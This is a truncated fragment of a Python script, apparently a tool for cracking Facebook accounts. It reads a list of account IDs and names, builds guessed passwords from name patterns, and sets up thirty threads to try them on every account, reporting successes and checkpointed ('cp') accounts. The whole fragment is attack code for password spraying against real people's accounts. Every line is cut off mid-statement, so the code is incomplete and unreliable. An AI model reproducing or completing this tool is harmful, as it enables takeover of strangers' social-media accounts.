...
def menu():
                ...
                #       os.system('xdg-open https://www.facebook.com/>
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/Fi>
                                linex()
                                file = input(' Put file path\033[1;37>
                                try:
                                        fo = open(file,'r').read().sp>
                                except FileNotFoundError:
                                        print(' File location not fou>
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' All method working ')
                                linex()
                                print(' \033[1;33m[1] \033[1;37mMetho>
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How ma>
                                except:
                                        ps_limit =1
                                clear()
                                print('\033[1;32m exp: first last,fir>
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put pas>
                                clear()
                                print(' Do you went show cp account? >
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        ...
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_su>
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' Total account ids : \>
                                        print(' \033[1;37mThe process>
                                        linex()
                                        for user in fo:
                                                ids,names = user.spli>
                                                passlist = plist
